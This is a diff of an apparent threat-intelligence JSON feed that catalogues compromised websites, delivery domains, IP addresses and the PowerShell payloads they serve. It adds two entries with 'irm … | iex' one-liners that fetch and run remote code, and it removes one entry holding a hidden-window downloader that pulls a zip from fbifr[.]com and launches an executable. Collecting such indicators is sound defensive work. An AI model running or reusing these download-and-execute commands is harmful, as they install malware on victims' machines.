@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "fiftyoff.co.za",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
+    ],
+    "IP": [
+      "41.204.202.6"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d9e2c158ed748001')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
+    ],
+    "ReportId": "cmwnlp7zj1wzj0omlkec6jirx",
+    "ScannedAt": "2026-11-19T13:43:35.418000+00:00"
+  },
+  {
+    "UrlDomain": "new.srdvrbas.ba",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
+    ],
+    "IP": [
+      "65.21.234.24"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8ef4c7e148048fda')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
+    ],
+    "ReportId": "cmwnlotyh1wyr0omlqyh8e3xl",
+    "ScannedAt": "2026-11-19T13:43:17.240000+00:00"
+  },
+  {
     "UrlDomain": "www.igaitconsulting.com",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -6572,24 +6610,5 @@
     ],
     "ReportId": "cmwjgekmp17wn0omlkwsofjbb",
     "ScannedAt": "2026-11-16T16:04:15.798000+00:00"
-  },
-  {
-    "UrlDomain": "futureexpected.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "77.37.83.140"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwjbc38k17of0omlpeppcn8t",
-    "ScannedAt": "2026-11-16T13:42:21.861000+00:00"
   }
 ]
